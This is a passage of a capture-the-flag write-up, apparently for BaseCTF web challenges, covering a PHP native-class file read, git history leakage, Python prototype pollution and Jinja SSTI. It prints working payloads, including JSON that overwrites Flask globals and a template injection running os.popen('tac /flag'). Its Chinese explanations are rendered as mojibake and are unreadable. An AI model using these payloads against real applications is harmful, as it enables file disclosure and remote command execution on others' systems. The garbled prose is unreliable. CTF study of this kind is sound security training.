punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">?K=DirectoryIterator&amp;W=/secret/?K=SplFileObject&amp;W=/secret/f11444g.php</code></pre><p><a href="https://www.anquanke.com/post/id/238482#h3-22">PHP åŸç”Ÿç±»åœ¨ CTF ä¸­çš„åˆ©ç”¨</a></p><h4 id="Back-to-the-future-gitæ³„éœ²"><a href="#Back-to-the-future-gitæ³„éœ²" class="headerlink" title="Back to the future(gitæ³„éœ²)"></a>Back to the future(gitæ³„éœ²)</h4><p>æ¨èä½¿ç”¨<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>åˆ©ç”¨å·¥å…·æŠŠè¿™ä¸ªé¡¹ç›®æ‹‰ä¸‹æ¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">githacker <span class="token parameter variable">--url</span> http://challenge.basectf.fun:49240/ <span class="token parameter variable">--output</span> back-future</code></pre><p>ä½¿ç”¨<code>git log</code>æŸ¥çœ‹æäº¤è®°å½•</p><p><img src="git.png" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ° <code>9d85f10e0192ef630e10d7f876a117db41c30417</code> è¿™ä¸ªæäº¤, æˆ‘ä»¬å¯ä»¥åˆ‡åˆ°é‚£ä¸€æ¬¡æäº¤</p><p><strong>åˆ‡æ¢åˆ°ç‰¹å®šæäº¤ï¼š</strong></p><p>ä½ å¯ä»¥ä½¿ç”¨æäº¤çš„å“ˆå¸Œå€¼ <strong><commit-hash></commit-hash></strong> æ¥åˆ‡æ¢åˆ°ç‰¹å®šçš„æäº¤çŠ¶æ€ã€‚è¿™å°†ä½¿ä½ è¿›å…¥â€åˆ†ç¦»å¤´æŒ‡é’ˆâ€çŠ¶æ€ï¼Œåªèƒ½æŸ¥çœ‹å†å²è®°å½•ï¼Œè€Œä¸èƒ½è¿›è¡Œåˆ†æ”¯æ“ä½œã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸å»ºè®®åœ¨åˆ†ç¦»å¤´æŒ‡é’ˆçŠ¶æ€ä¸‹å·¥ä½œï¼Œå› ä¸ºæ›´æ”¹å¯èƒ½ä¼šä¸¢å¤±ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 9d85f10e0192ef630e10d7f876a117db41c30417</code></pre><p>æˆ–è€…</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog</code></pre><p><img src="git_2.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 9d85f10</code></pre><h4 id="åœ£é’¥ä¹‹æˆ˜1-0-python-åŸå‹é“¾æ±¡æŸ“"><a href="#åœ£é’¥ä¹‹æˆ˜1-0-python-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åœ£é’¥ä¹‹æˆ˜1.0(python åŸå‹é“¾æ±¡æŸ“)"></a>åœ£é’¥ä¹‹æˆ˜1.0(python åŸå‹é“¾æ±¡æŸ“)</h4><p>&#x2F;read</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f"J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿé‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag<span class="token punctuation">(</span>ä¹<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>"<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"J1ngHongè¯´ï¼šé’¥åŒ™åœ£æ´æ— æš‡ï¼Œæ— äººå¯ä»¥æ±¡æŸ“ï¼"</span>    <span class="token keyword">return</span> <span class="token string">"J1ngHongè¯´ï¼šåœ£é’¥æš—æ·¡äº†ä¸€ç‚¹ï¼Œä½ å±…ç„¶æ±¡æŸ“æˆåŠŸäº†ï¼Ÿ"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>çœ‹åˆ°index.htmlæºç æœ‰å¼ å›¾ç‰‡</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>J1ngHong's Message<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>J1ngHongè¯´ï¼šè¿™æ˜¯åœ£é’¥ï¼Œçº¯å‡€æ— æš‡ï¼Œä¸èƒ½æ±¡æŸ“ï¼Œä½†æ˜¯ä½ å¯ä»¥å»readé‚£é‡Œæ‰¾ä¸€ä¸‹flag~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/1.jpeg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.jpeg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>æ­¤æ—¶<code>http://domain/static/xxx</code>åªèƒ½è®¿é—®åˆ°æ–‡ä»¶ç³»ç»Ÿå½“å‰ç›®å½•ä¸‹<code>static</code>ç›®å½•ä¸­çš„<code>xxx</code>æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å­˜åœ¨å¦‚ç›®å½•ç©¿è¶Šçš„æ¼æ´</p><p>æ±¡æŸ“è¯¥å±æ€§ä¸ºå½“æ ¹ç›®å½•ã€‚è¿™æ ·å°±èƒ½è®¿é—®åˆ°æ ¹ç›®å½•ä¸‹çš„<code>flag</code>æ–‡ä»¶äº†</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/pollute</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:27598</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">59</span></span><span class="token application-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å®˜æ–¹wp</p><p>ç›´æ¥è¿›&#x2F;readçœ‹æºç ï¼Œç„¶åè¿›&#x2F;flagè¿›è¡Œpostæ–¹æ³•ä¼ å‚ä¸€ä¸ªjsonçš„payloadï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__file__"</span><span class="token operator">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç„¶åå»&#x2F;readå°±æœ‰flagäº†ã€‚</p><p><a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“</a></p><p><a href="https://xz.aliyun.com/t/14620?u_atoken=65ddecfdc7f9515861cf73192c653805&u_asession=01tg4Re7x0Sqx3A9faMOrup1F3mTWuKaW_b83fFDALPOQjbSlByuTWDvmso5UJrutRJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05KUap-1IvBgPL8vv3yGCEzc48Q3oSFVi6MzLmEIrnKCHNj-TcUYd0qEjBQBggpCmBY4-dXw-Dff-QxyIWhBRxKivSQQy06u45IR3F7Ej5igWbWdYp_mc4TBTzDPCYHzJJHdqLK01P4bnw7O9Ygq_e03flitwL3Wj5Od6rPKqtngzBzhvSc0Kr8URjOX9Xe4tkTrTE5w3F08xyE75_wBFoikKIg66WHK8pgCdoRnyOQXTt782cQmBlQQJQ9IDcYv2cGsWAe-e_PYvPamjVaebg-CAqscTuE4GHrj-VNCf8HPd6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=8PtQL6DjIKQRdT5m/qOLtcLvayM=">ä»CISCN2024çš„sanicå¼•å‘å¯¹pythonâ€œåŸå‹é“¾â€çš„æ±¡æŸ“æŒ–æ˜</a></p><p><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIeAK37KG=22BDRgibD#toc-6">æµ…è°ˆPythonåŸå‹é“¾æ±¡æŸ“åŠåˆ©ç”¨æ–¹å¼</a></p><h4 id="Jinja-Mark-åŸå‹é“¾æ±¡æŸ“-ssti"><a href="#Jinja-Mark-åŸå‹é“¾æ±¡æŸ“-ssti" class="headerlink" title="Jinja Mark(åŸå‹é“¾æ±¡æŸ“+ssti)"></a>Jinja Mark(åŸå‹é“¾æ±¡æŸ“+ssti)</h4><p>è®¿é—®indexç›®å½• æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†èŠ±æ‹¬å·çš„sstiæ³¨å…¥ ä¸è¿‡æµ‹è¯•49 å¾—åˆ°hint magicç›®å½• è¦æ±‚ä¼ å…¥json</p><p>è®¿é—®flagç›®å½• å¾—åˆ°hint</p><pre class="language-php" data-language="php"><code class="language-php">ä½ ä¸ä¼šä»¥ä¸ºè¿™é‡ŒçœŸçš„æœ‰flagå§ï¼Ÿæƒ³è¦flagçš„è¯å…ˆçŒœçŒœæˆ‘çš„å¹¸è¿æ•°å­—ç”¨<span class="token constant">POST</span>æ–¹å¼æŠŠ lucky_number å‘Šè¯‰æˆ‘å§ï¼Œåªæœ‰å››ä½æ•°å“¦</code></pre><p>çŒœå‡ºå¹¸è¿æ•°å­—è¿”å›äº† magicçš„æºç  pythonåŸå‹é“¾æ±¡æŸ“</p><pre class="language-python" data-language="python"><code class="language-python">BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/magic'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"æˆ‘è¦jsonçš„é­”æœ¯"</span>    <span class="token keyword">return</span> <span class="token string">"è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥"</span></code></pre><p>è¿™é‡Œå¯¹åº”çš„mergeå‡½æ•°å°±æ˜¯pythonä¸­å¯¹å±æ€§å€¼æ§åˆ¶çš„ä¸€ä¸ªæ“ä½œï¼Œæˆ‘ä»¬æ¥ç®€å•çš„è§£é‡Šä¸€ä¸‹ï¼šmergeä¸­æˆ‘ä»¬ç»“åˆnodejsçš„mergeæ¥ç†è§£ï¼Œå°±æ˜¯å°†æºå‚æ•°èµ‹å€¼åˆ°ç›®æ ‡å‚æ•°ã€‚</p><p>ç„¶åå¯¹srcä¸­çš„é”®å€¼å¯¹è¿›è¡Œäº†éå†ï¼Œç„¶åæ£€æŸ¥dstä¸­æ˜¯å¦å«æœ‰<code>__getitem__</code>å±æ€§ï¼Œä»¥æ­¤æ¥åˆ¤æ–­dstæ˜¯å¦ä¸ºå­—å…¸ã€‚å¦‚æœå­˜åœ¨çš„è¯ï¼Œæ£€æµ‹dstä¸­æ˜¯å¦å­˜åœ¨å±æ€§kä¸”valueæ˜¯å¦æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±ç»§ç»­åµŒå¥—mergeå¯¹å†…éƒ¨çš„å­—å…¸å†è¿›è¡Œéå†ï¼Œå°†å¯¹åº”çš„æ¯ä¸ªé”®å€¼å¯¹éƒ½å–å‡ºæ¥ã€‚å¦‚æœä¸å­˜åœ¨çš„è¯å°±å°†srcä¸­çš„valueçš„å€¼èµ‹å€¼ç»™dstå¯¹åº”çš„keyçš„å€¼ã€‚</p><p>å¦‚æœdstä¸å«æœ‰getitemå±æ€§çš„è¯ï¼Œé‚£å°±è¯´æ˜dstä¸æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå°±ç›´æ¥æ£€æµ‹dstä¸­æ˜¯å¦å­˜åœ¨kçš„å±æ€§ï¼Œå¹¶æ£€æµ‹è¯¥å±æ€§å€¼æ˜¯å¦ä¸ºå­—å…¸ï¼Œå¦‚æœæ˜¯çš„è¯å°±å†é€šè¿‡mergeå‡½æ•°è¿›è¡Œéå†ï¼Œå°†kä½œä¸ºdstï¼Œvä½œä¸ºsrcï¼Œç»§ç»­å–å‡ºvé‡Œé¢çš„é”®å€¼å¯¹è¿›è¡Œéå†ã€‚</p><p><strong>æ‰€ä»¥åœ¨&#x2F;magicè·¯ç”±ä¸‹æ±¡æŸ“jinjaçš„è¯­æ³•æ ‡è¯†ç¬¦ï¼Œå°†â€,â€œä¿®æ”¹ä¸ºâ€&lt;&lt;â€,â€&gt;&gt;â€æˆ–è€…å…¶ä»–ä¸å½±å“sstiæ³¨å…¥çš„ç¬¦å·ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼Œä¼ å…¥åå»&#x2F;indexè¿›è¡Œæ— è¿‡æ»¤çš„sstiæ³¨å…¥å³å¯</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"&lt;&lt;"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">">>"</span><span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¿®æ”¹åæ­£å¸¸sstiå³å¯ å¤§éƒ¨åˆ†éƒ½æ²¡æœ‰ban</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">=</span><span class="token operator">&lt;&lt;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span></code></pre><h4 id="Lucky-Number-åŸå‹é“¾æ±¡æŸ“plus"><a href="#Lucky-Number-åŸå‹é“¾æ±¡æŸ“plus" class="headerlink" title="Lucky Number(åŸå‹é“¾æ±¡æŸ“plus)"></a>Lucky Number(åŸå‹é“¾æ±¡æŸ“plus)</h4><p>è®¿é—®flagç›®å½•å¾—åˆ°</p><pre class="language-python" data-language="python"><code class="language-python">ä½ ä¸ä¼šä»¥ä¸ºè¿™é‡ŒçœŸçš„æœ‰flagå§ï¼Ÿæƒ³è¦flagçš„è¯å…ˆæäº¤æˆ‘çš„å¹¸è¿æ•°å­—<span class="token number">5346</span>ä½†æ˜¯æˆ‘çš„ä¸»äººè§‰å¾—æˆ‘æ³„éœ²äº†å¤ªå¤šä¿¡æ¯ï¼Œå°±æŠŠæˆ‘çš„å¹¸è¿æ•°å­—ç»™åˆ é™¤äº†ä½†æ˜¯å¬è¯´åœ¨heavenä¸­æœ‰ä¸€ç§createæ–¹æ³•ï¼Œé…åˆ__kwdefaults__å¯ä»¥åˆ›é€ å‡ºä»»ä½•äº‹ç‰©ï¼Œä½ å¯ä»¥å»<span class="token operator">/</span>m4G1cé‡Œå°è¯•ç€æ¥è§¦åˆ°è¿™ä¸ªæ–¹æ³•ä¸‹é¢æ˜¯å‰äººç•™ä¸‹æ¥çš„ä¿¡æ¯ï¼Œå¸Œæœ›å¯¹ä½ æœ‰ç”¨<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">import</span> json<span class="token keyword">import</span> heaven<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token 